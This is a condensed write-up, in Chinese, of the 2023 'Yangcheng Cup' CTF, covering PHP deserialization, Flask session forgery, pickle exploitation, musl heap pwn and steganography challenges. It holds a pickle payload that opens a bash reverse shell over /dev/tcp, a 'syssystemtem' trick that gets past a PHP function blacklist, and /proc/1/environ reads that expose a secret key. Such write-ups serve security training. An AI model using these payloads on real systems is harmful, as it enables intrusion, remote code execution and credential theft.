---
title: 2023 年"羊城杯"网络安全大赛 Writeup
contest: 羊城杯 2023
year: 2023
difficulty: hard
vuln_type: misc_unknown
tags: [PHP反序列化, preg_replace过滤, 字符串重组绕黑名单, Flask_session伪造, pickle反序列化, musl_libc, ORW, CVE-2023-28303, 零宽隐写, VeraCrypt, blind_watermark]
attack_chain:
  - D0n't pl4y g4m3: php 反序列化，prohib 过滤 system/exec/passthru 等
  - syssystemtem 字符串重组绕过 preg_replace
  - Bei__destruct → Yang__call → call_user_func 链
  - Serpent: Flask session 伪造 secret_key=GWHT1GGAvNAKvF
  - pickle.loads(base64) 反序列化 + cos system bash -i 反弹 shell
  - 提权用 python3.8 SUID 读 /flag
  - ArkNights: /proc/1/environ 非预期读 secret_key
  - shellcode: 自写 ORW 汇编
  - cookieBox: musl libc UAF + FSOP + __stdin_FILE 劫持栈
  - easy_vm: 任意地址写 + exit_hook + one_gadget + 爆破 ld
  - ai 和 nia: flag2.zip 零宽隐写 + flag1.png LSB 隐写 + B 站视频定位
  - EZ_misc: Gronsfeld 密码 + CVE-2023-28303 截图恢复
  - Matryoshka: blind_watermark 解出 Watermark_is_fun + VeraCrypt 挂载
key_payload: 'syssystemtem → system, secret_key=GWHT1GGAvNAKvF, /proc/1/environ'
one_liner: 羊城杯综合：PHP 反序列化字符串重组 + Flask session 伪造 + musl libc UAF + 零宽/LSB 隐写。
lesson: preg_replace 可用 syssystemtem 重组绕；Flask session secret_key 可从 /proc/1/environ 拿；musl libc UAF 用 FSOP 劫持 __stdin_FILE。
quality: high
---

# 2023 年"羊城杯"网络安全大赛 Writeup

## 来源
- 原文：ctfiot.com/133282.html

## 11 道题详解

### WEB
1. **D0n't pl4y g4m3**（PHP 反序列化字符串重组）
   - `prohib` 过滤 `system|exec|passthru|shell_exec|popen|proc_open|pcntl_exec|eval|flag`
   - payload 用 `syssystemtem` 重组还原 `system`
   - Bei__destruct → Yang__call → call_user_func 链
   - payload: `cat /tmp/catcatf1ag.txt`

2. **Serpent**（Flask session 伪造 + pickle）
   - session 注入 `Attribute={admin:1, name:'admin', secret_key:'GWHT1GGAvNAKvF'}`
   - 修改 session 访问 /verification
   - /src0de 路由暴露源码
   - /ppppppppppick1e 用 pickle.loads 反序列化
   - opcode: `(cos\nsystem\nS'bash -i >& /dev/tcp/...'\no.`
   - 反弹 shell + python3.8 SUID 读 /flag
   - flag: `DASCTF{96457914264959329419758606761175}`

3. **ArkNights**（/proc/1/environ 读 secret_key）
   - `/read?file=/proc/1/environ` 非预期
   - 预期：从内存中获取 secret_key
   - 内存搜 `secret_key=xxx` 模式

### PWN
4. **shellcode**（ORW 汇编）
   ```python
   shellcode = '''
       push 0x67616c66  # "flag"
       mov rdi, rsp
       xor esi, esi
       push 2
       pop rax
       syscall  # open
       ...
   '''
   ```
   - sys_open + sys_read + sys_write

5. **cookieBox**（musl libc UAF）
   - musl libc 堆结构是双链表
   - leak libc → 改 fd/bk → FSOP → 劫持栈 → ORW
   - 申请到 `__stdin_FILE+0x40` 位置
   - 触发 __stdin_FILE 调用链

6. **easy_vm**（任意地址写 + exit_hook）
   - one_gadget 0xf1147
   - 改 exit_hook 为 one_gadget
   - 爆破 ld 偏移（0x5<<20 + (i<<12) + 0xf48）

### Misc
7. **ai 和 nia 的交响曲**
   - flag2.zip 伪加密解压
   - flag2.txt 零宽隐写
   - flag1.png LSB 隐写 → 视频 ID BV1wW4y1R7Jv
   - 视频时间轴定位后半段 flag
   - flag: `@i_n1a_l0v3S_CAOCAOGAIFAN`

8. **EZ_misc**（Gronsfeld + CVE-2023-28303）
   - Gronsfeld.png 分离 zip → feld.txt
   - Gronsfeld 密码爆破
   - CVE-2023-28303 Windows 11 截图工具泄露
   - Acropalypse-Multi-Tool 恢复截图
   - flag: `CvE_1s_V3Ry_intEr3sting!!`

9. **Matryoshka**（VeraCrypt + 盲水印）
   - 奇安信取证找文件
   - blind_watermark 解盲水印 `Watermark_is_fun`
   - VeraCrypt 挂载加密磁盘（小写密码）
   - flag.txt 零宽隐写
   - 密钥 Matryoshka → base32 + 维吉尼亚

## 关键技巧
- **字符串重组**：syssystemtem → system
- **Flask session 伪造**：/proc/1/environ 拿 secret_key
- **musl libc UAF**：双链表结构 + FSOP + __stdin_FILE
- **零宽隐写**：.txt 文件零宽字符藏 flag
- **LSB 隐写**：png LSB 提视频 ID
- **CVE-2023-28303**：Windows 11 截图工具泄露被裁剪部分
- **VeraCrypt + 盲水印**：密码藏在图片里

## 适用场景
- PHP 反序列化绕过
- Flask session 伪造
- musl libc 堆利用
- Misc 综合隐写
- 真实 CVE 利用
